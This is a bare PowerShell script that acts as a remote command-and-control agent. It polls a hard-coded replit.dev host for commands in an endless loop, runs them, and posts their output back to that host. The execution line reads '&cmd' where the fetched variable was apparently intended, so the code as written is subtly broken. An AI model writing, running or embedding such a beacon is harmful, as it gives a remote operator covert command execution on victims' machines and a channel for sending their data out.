$apilink = "https://ca03a3be-0d9f-4de1-a90a-4c0d57e03f1c-00-7cx9kmgwyxdc.picard.replit.dev"
$cmd = ""

while ($true) {
    $new_cmd = (Invoke-RestMethod -Uri "$apilink/getcmd" -Method Get).Trim()

    if ($new_cmd -ne $cmd) {
        $cmd = $new_cmd

        $output = &cmd | Out-String

        $output = $output.Trim()
        Invoke-RestMethod -Uri "$apilink/setoutput" -Method Post -Body @{output=$output}

    } else {
        Start-Sleep -Seconds 2
    }
}
